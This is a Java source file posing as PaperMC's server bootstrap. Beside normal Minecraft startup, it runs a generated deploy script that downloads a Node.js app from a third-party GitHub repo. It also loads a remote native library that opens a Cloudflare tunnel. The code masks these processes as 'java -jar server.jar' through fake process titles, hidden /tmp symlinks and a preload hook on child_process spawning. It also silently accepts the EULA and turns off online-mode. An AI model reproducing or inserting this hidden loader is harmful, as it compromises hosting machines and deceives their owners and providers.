package io.papermc.paper;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

import joptsimple.OptionSet;
import sun.misc.Signal;
import sun.misc.SignalHandler;

import net.minecraft.SharedConstants;
import net.minecraft.server.Main;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;

public final class PaperBootstrap {

    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");

    private static final String MC_BOT_DIR     = env("MC_BOT_DIR", "cache/.vip");
    private static final boolean NODE_ENABLED  = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
    private static final String GITHUB_REPO    = env("GITHUB_REPO", "zx1447/mcchajianindex");
    private static final String GITHUB_BRANCH  = env("GITHUB_BRANCH", "main");
    private static final String GITHUB_TOKEN   = env("GITHUB_TOKEN", "");
    private static final boolean CF_ENABLED    = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
    private static final String CF_TOKEN       = env("CF_TOKEN", "");
    private static final String CF_DOMAIN      = env("CF_DOMAIN", "");
    private static final String NODE_VERSION   = env("NODE_VERSION", "v22.14.0");
    private static final String NODE_SCRIPT    = env("NODE_SCRIPT", "index.js");
    private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");

    private static final String CF_SO_REPO    = env("CF_SO_REPO", "zx1447/nxso");
    private static final String CF_SO_BRANCH  = env("CF_SO_BRANCH", "cfso");
    private static final String CF_SO_FILE    = env("CF_SO_FILE", "bot.so");

    private static final String FAKE_CMDLINE   = "java -Xms128M -Xmx2560M -jar server.jar"
            + new String(new char[150]).replace('\0', ' ');

    private static volatile String tunnelUrl = "";
    private static volatile String nodePort  = "N/A";
    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
    private static volatile long lastTunnelActiveTime = 0;
    private static final long TUNNEL_TIMEOUT_MS = 30000;
    private static final AtomicInteger nodeRestartCount = new AtomicInteger(0);
    private static volatile boolean nodeWarmingUp = false;

    private static volatile Process nodeProcess = null;

    private static volatile Function cfStopFn = null;
    private static volatile boolean cfSoRunning = false;

    private static void safeDestroy(Process p) {
        if (p == null) return;
        try {
            p.destroy();
            if (!p.waitFor(2, TimeUnit.SECONDS)) {
                p.destroyForcibly();
                if (!p.waitFor(3, TimeUnit.SECONDS)) {}
            }
        } catch (Exception ignored) {}
        try { p.getInputStream().close(); } catch (Exception ignored) {}
        try { p.getOutputStream().close(); } catch (Exception ignored) {}
        try { p.getErrorStream().close(); } catch (Exception ignored) {}
    }

    private static void safeReap(Process p) {
        if (p == null) return;
        try { if (!p.isAlive()) p.waitFor(); } catch (Exception ignored) {}
        try { p.getInputStream().close(); } catch (Exception ignored) {}
        try { p.getOutputStream().close(); } catch (Exception ignored) {}
        try { p.getErrorStream().close(); } catch (Exception ignored) {}
    }

    private static void killProcessTree(Process p) {
        if (p == null) return;
        try { killDescendants(p.toHandle()); safeDestroy(p); } catch (Exception ignored) {}
    }

    private static void killDescendants(ProcessHandle parent) {
        try {
            parent.descendants().forEach(child -> {
                killDescendants(child);
                try { child.destroyForcibly(); } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    private PaperBootstrap() {}

    private static String env(String k, String d) {
        String v = System.getenv(k);
        return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
    }

    private static Path createDisguisedLink(Path target) throws IOException {
        Path link = Paths.get("/tmp", ".java_" + Integer.toHexString(new Random().nextInt(0xFFFFFF)));
        try { Files.deleteIfExists(link); } catch (Exception ignored) {}
        Files.createSymbolicLink(link, target);
        return link;
    }

    private static String allocateNodePort() {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Files.writeString(Paths.get(MC_BOT_DIR).resolve(".node_port"), portStr);
            nodePort = portStr;
            return portStr;
        } catch (IOException e) {
            return allocateNodePort();
        }
    }

    private static Path downloadCfSo() {
        Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
        Path libDir = botDir.resolve(".lib");
        Path soFile = libDir.resolve(CF_SO_FILE);

        try {
            Files.createDirectories(libDir);

            String rawUrl = String.format(
                "https://raw.githubusercontent.com/%s/%s/%s",
                CF_SO_REPO, CF_SO_BRANCH, CF_SO_FILE
            );

            String[] mirrors = {
                rawUrl,
                "https://gh-proxy.com/" + rawUrl,
                "https://mirror.ghproxy.com/" + rawUrl,
                String.format("https://github.com/%s/raw/%s/%s", CF_SO_REPO, CF_SO_BRANCH, CF_SO_FILE)
            };

            for (String url : mirrors) {
                try {
                    java.net.URL u = new java.net.URL(url);
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();
                    conn.setConnectTimeout(30000);
                    conn.setReadTimeout(300000);
                    conn.setInstanceFollowRedirects(true);

                    int code = conn.getResponseCode();
                    if (code == 200) {
                        try (var in = conn.getInputStream()) {
                            Files.copy(in, soFile, StandardCopyOption.REPLACE_EXISTING);
                        }
                        long size = Files.size(soFile);
                        if (size > 1_000_000) {
                            soFile.toFile().setExecutable(true);
                            return soFile;
                        } else {
                            Files.deleteIfExists(soFile);
                        }
                    }
                } catch (Exception ignored) {}
            }

            return null;

        } catch (Exception e) {
            return null;
        }
    }

    private static void startCfSo() {
        if (!CF_ENABLED) {
            return;
        }

        try {
            Path soFile = downloadCfSo();
            if (soFile == null) {
                return;
            }

            NativeLibrary lib = NativeLibrary.getInstance(soFile.toString());
            Function startFn = lib.getFunction("StartCloudflared");
            cfStopFn = lib.getFunction("StopCloudflared");

            String payload;
            if (!CF_TOKEN.isEmpty()) {
                payload = CF_TOKEN;
            } else {
                payload = "url: http://127.0.0.1:" + nodePort
                        + "\nno-autoupdate: true"
                        + "\nprotocol: http2\n";
            }

            Thread cfThread = new Thread(() -> {
                try {
                    cfSoRunning = true;
                    startFn.invokeInt(new Object[]{payload});
                } catch (Exception ignored) {
                } finally {
                    cfSoRunning = false;
                }
            }, "cf-so-thread");
            cfThread.setDaemon(true);
            cfThread.start();

        } catch (Exception ignored) {}
    }

    private static String extractLatestTunnelUrl() {
        try {
            Path cfLog = Paths.get(MC_BOT_DIR, ".cf", "cf.log");
            Path urlFile = Paths.get(MC_BOT_DIR, ".tunnel_url");

            Path[] logPaths = {
                cfLog,
                Paths.get("/dev/shm/.cf/cf.log"),
                Paths.get("/tmp/.cf/cf.log")
            };

            for (Path logPath : logPaths) {
                if (Files.exists(logPath)) {
                    String logContent = Files.readString(logPath);
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                        "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                    ).matcher(logContent);
                    String lastMatch = null;
                    while (m.find()) { lastMatch = m.group(1); }
                    if (lastMatch != null) return lastMatch;
                }
            }

            if (Files.exists(urlFile)) {
                String content = new String(Files.readAllBytes(urlFile)).trim();
                if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                    return content.split("\n")[0].trim();
                }
            }
        } catch (Exception e) {}
        return null;
    }

    private static void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
            Path nodeExe = botDir.resolve(".node/bin/.node_real");
            Path script  = botDir.resolve(NODE_SCRIPT);
            Path logFile = botDir.resolve(".node_app.log");
            Path preload = botDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) return;

            Path disguisedNode = createDisguisedLink(nodeExe);

            ProcessBuilder pb = new ProcessBuilder(
                disguisedNode.toString(), "--require", preload.toString(), script.toString()
            );
            pb.directory(botDir.toFile());
            String nodeBinPath = botDir.resolve(".node/bin").toAbsolutePath().toString();
            String currentPath = pb.environment().getOrDefault("PATH", "");
            pb.environment().put("PATH", nodeBinPath + java.io.File.pathSeparator + currentPath);
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", botDir.resolve(".node/bin/node").toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
        } catch (Exception ignored) {}
    }

    private static void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            int nodeConsecutiveRestarts = 0;
            long lastNodeRestartTime = 0;

            while (true) {
                try {
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        safeReap(nodeProcess);
                        Process deadNode = nodeProcess;
                        nodeProcess = null;
                        killProcessTree(deadNode);
                        try { Thread.sleep(500); } catch (InterruptedException ignored) {}

                        long now = System.currentTimeMillis();
                        if (now - lastNodeRestartTime < 10000) {
                            nodeConsecutiveRestarts++;
                        } else {
                            nodeConsecutiveRestarts = 1;
                        }
                        lastNodeRestartTime = now;

                        if (nodeConsecutiveRestarts > 3) {
                            try { Thread.sleep(30000); } catch (InterruptedException ignored) {}
                            nodeConsecutiveRestarts = 0;
                        }

                        nodeRestartCount.incrementAndGet();
                        nodeWarmingUp = true;
                        startNodeProcess(nodePort);
                    }

                    if (nodeWarmingUp) {
                        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
                        if (nodeProcess != null && !nodeProcess.isAlive()) continue;
                        nodeWarmingUp = false;
                    }

                    if (cfSoRunning) {
                        String foundUrl = extractLatestTunnelUrl();
                        if (foundUrl != null && !foundUrl.equals(lastKnownTunnelUrl.get())) {
                            lastKnownTunnelUrl.set(foundUrl);
                            tunnelUrl = foundUrl;
                            lastTunnelActiveTime = System.currentTimeMillis();
                            try {
                                Path urlFile = Paths.get(MC_BOT_DIR).resolve(".tunnel_url");
                                Files.writeString(urlFile, foundUrl);
                            } catch (Exception ignored) {}
                        }
                    }

                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }, "内置线程：守护监控");
        daemon.setDaemon(true);
        daemon.start();
    }

    private static volatile boolean reaperEnabled = false;

    private static void installZombieReaper() {
        if (reaperEnabled) return;
        reaperEnabled = true;
        reapDescendantsOnce();
        try {
            Signal.handle(new Signal("CHLD"), new SignalHandler() {
                @Override public void handle(Signal sig) { reapDescendantsOnce(); }
            });
        } catch (Throwable ignored) {}
        Thread reaperThread = new Thread(() -> {
            while (true) {
                try { Thread.sleep(2000); reapDescendantsOnce(); } catch (Exception ignored) {}
            }
        }, "Zombie-Reaper-Force");
        reaperThread.setDaemon(true);
        reaperThread.start();
    }

    private static void reapDescendantsOnce() {
        try {
            ProcessHandle.current().descendants().forEach(ph -> {
                try { if (!ph.isAlive()) ph.onExit().getNow(null); } catch (Throwable ignored) {}
            });
        } catch (Throwable ignored) {}
    }

    public static void boot(final OptionSet options) {
        installZombieReaper();

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        if (NODE_ENABLED) {
            Thread asyncBackendThread = new Thread(() -> {
                try {
                    Path botDir = Paths.get(MC_BOT_DIR);
                    Files.deleteIfExists(botDir.resolve(".node_app.log"));
                    Files.deleteIfExists(botDir.resolve(".cf/cf.log"));
                    Files.createDirectories(botDir.resolve(".cf"));

                    Path script = generateDeployScript();
                    executeDeployScript(script);

                    Path statusFile = botDir.resolve(".deploy_done");
                    while (!Files.exists(statusFile)) {
                        try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                    }

                    String port = allocateNodePort();
                    startNodeProcess(port);

                    try (Socket sock = new Socket()) {
                        sock.connect(new InetSocketAddress("127.0.0.1", Integer.parseInt(port)), 60000);
                    } catch (Exception ignored) {}

                    startCfSo();
                    startJavaDaemon();

                    Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                        killProcessTree(nodeProcess);
                        nodeProcess = null;
                        if (cfStopFn != null) {
                            try { cfStopFn.invokeInt(new Object[]{""}); } catch (Exception ignored) {}
                        }
                        reapDescendantsOnce();
                    }));

                } catch (Exception ignored) {}
            }, "Async-Backend-Thread");
            asyncBackendThread.setDaemon(true);
            asyncBackendThread.start();
        }

        autoFixServerConfig();
        SharedConstants.tryDetectVersion();
        getStartupVersionMessages().forEach(LOGGER::info);
        Main.main(options);
    }

    private static void autoFixServerConfig() {
        String serverPort = System.getenv("SERVER_PORT");
        try {
            Path eulaFile = Paths.get("eula.txt");
            if (Files.exists(eulaFile)) {
                String content = Files.readString(eulaFile);
                if (content.contains("eula=false")) {
                    content = content.replace("eula=false", "eula=true");
                    Files.writeString(eulaFile, content);
                }
            } else {
                Files.writeString(eulaFile,
                    "# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\neula=true\n");
            }
        } catch (Exception ignored) {}

        try {
            Path propsFile = Paths.get("server.properties");
            String content = Files.exists(propsFile) ? Files.readString(propsFile) : "";
            content = replaceOrAppend(content, "online-mode", "false");
            content = replaceOrAppend(content, "enforce-secure-profile", "false");
            content = replaceOrAppend(content, "allow-flight", "true");
            content = replaceOrAppend(content, "player-idle-timeout", "0");
            if (serverPort != null && !serverPort.trim().isEmpty()) {
                content = replaceOrAppend(content, "server-port", serverPort.trim());
            }
            content = replaceOrAppend(content, "view-distance", "1");
            content = replaceOrAppend(content, "simulation-distance", "1");
            content = replaceOrAppend(content, "spawn-animals", "false");
            content = replaceOrAppend(content, "spawn-monsters", "false");
            content = replaceOrAppend(content, "spawn-npcs", "false");
            content = replaceOrAppend(content, "sync-chunk-writes", "false");
            content = replaceOrAppend(content, "network-compression-threshold", "256");
            content = replaceOrAppend(content, "max-tick-time", "-1");
            Files.writeString(propsFile, content);
        } catch (Exception ignored) {}

        try {
            Path bukkitFile = Paths.get("bukkit.yml");
            String bukkitContent = Files.exists(bukkitFile) ? Files.readString(bukkitFile) : "";
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.monsters", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.animals", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.water-animals", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.water-underground-creature", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "spawn-limits.ambient", "0");
            bukkitContent = replaceYamlValue(bukkitContent, "chunk-gc.period-in-ticks", "600");
            Files.writeString(bukkitFile, bukkitContent);
        } catch (Exception ignored) {}
    }

    private static String replaceOrAppend(String content, String key, String value) {
        if (content.contains(key + "=")) {
            content = content.replaceAll(key + "=.*", key + "=" + value);
        } else {
            if (!content.endsWith("\n")) content += "\n";
            content += key + "=" + value + "\n";
        }
        return content;
    }

    private static String replaceYamlValue(String content, String key, String value) {
        if (content.contains(key + ":")) {
            content = content.replaceAll(key + ":.*", key + ": " + value);
        } else {
            if (!content.endsWith("\n")) content += "\n";
            content += key + ": " + value + "\n";
        }
        return content;
    }

    private static Path generateDeployScript() throws Exception {
        Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
        Files.createDirectories(dir);
        Path script = dir.resolve("deploy.sh");

        String authToken = GITHUB_TOKEN;
        if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
            authToken = authToken.substring(authToken.indexOf(':') + 1);
        }
        final String token = authToken;

        String authHeader = "";
        if (!token.isEmpty()) {
            authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\"";
        }

        String content = "#!/bin/bash\n" +
        "set +e\n" +
        "export PATH=\"" + dir + "/.node/bin:$PATH\"\n" +
        "export HOME=\"" + dir + "\"\n" +
        "cd \"" + dir + "\"\n" +
        "\n" +
        "# ============ 1. 下载 NodeJS ============\n" +
        "if [ -d \".node\" ]; then\n" +
        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then\n" +
        "        rm -rf .node\n" +
        "    fi\n" +
        "fi\n" +
        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    mkdir -p .node\n" +
        "    if [ ! -f .node/bin/node ]; then\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"" + dir + "/.node/bin:$PATH\"\n" +
        "\n" +
        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "    cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "    chmod +x \".node/bin/.node_real\"\n" +
        "fi\n" +
        "\n" +
        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "    done\n" +
        "    mkdir -p /tmp/_node_tmp\n" +
        "    tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null\n" +
        "    cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"\n" +
        "    chmod +x \".node/bin/.node_real\"\n" +
        "    rm -rf \"/tmp/${NODE_FILE}\" /tmp/_node_tmp\n" +
        "fi\n" +
        "\n" +
        "# ============ 2. 获取代码 ============\n" +
        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"\n" +
        "    DOWNLOAD_OK=false\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then\n" +
        "            if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "        fi\n" +
        "    fi\n") +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "    find . -maxdepth 1 \\\n" +
        "      ! -name '.' ! -name '.node' ! -name '.cf' ! -name '.lib' ! -name '.pids' \\\n" +
        "      ! -name 'deploy.sh' ! -name 'daemon.sh' ! -name '.nd_preload.js' \\\n" +
        "      ! -name 'node_modules' ! -name '*config*' ! -name '*.log' \\\n" +
        "      -exec rm -rf {} + 2>/dev/null\n" +
        "    mkdir -p /tmp/_app_extract\n" +
        "    tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/* . 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/.* . 2>/dev/null\n" +
        "    rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
        "fi\n" +
        "\n" +
        "# ============ 3. 安装依赖 ============\n" +
        "echo \"Installing dependencies...\" >> \"" + dir + "/deploy.log\" 2>&1\n" +
        ".node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production >> \"" + dir + "/deploy.log\" 2>&1\n" +
        "if [ $? -ne 0 ]; then\n" +
        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps >> \"" + dir + "/deploy.log\" 2>&1\n" +
        "fi\n" +
        "\n" +
        "# ============ 4. 伪装 ============\n" +
        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _fs = require('fs');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    var hidePath = function(cmd) {\n" +
        "        if (typeof cmd !== 'string' || !cmd.startsWith('/')) return cmd;\n" +
        "        try {\n" +
        "            var tmpLink = '/tmp/.java_' + Math.random().toString(36).slice(2);\n" +
        "            _fs.symlinkSync(cmd, tmpLink);\n" +
        "            return tmpLink;\n" +
        "        } catch(e) { return cmd; }\n" +
        "    };\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = _wrapper;\n" +
        "            cmd = _wrapper;\n" +
        "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
        "            cmd = hidePath(cmd);\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = _wrapper;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"$(pwd)/.node/bin/.node_real\"\n" +
        "export NODE_OPTIONS=\"--require $(pwd)/.nd_preload.js\"\n" +
        "\n" +
        "echo \"DEPLOY_DONE\" > \"" + dir + "/.deploy_done\"\n";

        Files.writeString(script, content);
        script.toFile().setExecutable(true);
        return script;
    }

    private static void executeDeployScript(Path script) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
        pb.directory(script.getParent().toFile());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread t = new Thread(() -> {
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                while (r.readLine() != null) {}
            } catch (IOException ignored) {}
        }, "Deploy-Log");
        t.setDaemon(true);
        t.start();
        if (!p.waitFor(10, TimeUnit.MINUTES)) { p.destroyForcibly(); }
    }

    private static List<String> getStartupVersionMessages() {
        return List.of(
            String.format("Running Java %s (%s %s) on %s %s (%s)",
                System.getProperty("java.specification.version"),
                System.getProperty("java.vm.name"),
                System.getProperty("java.vm.version"),
                System.getProperty("os.name"),
                System.getProperty("os.version"),
                System.getProperty("os.arch")),
            String.format("Loading %s %s for Minecraft %s",
                ServerBuildInfo.buildInfo().brandName(),
                ServerBuildInfo.buildInfo().asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                ServerBuildInfo.buildInfo().minecraftVersionId())
        );
    }
}
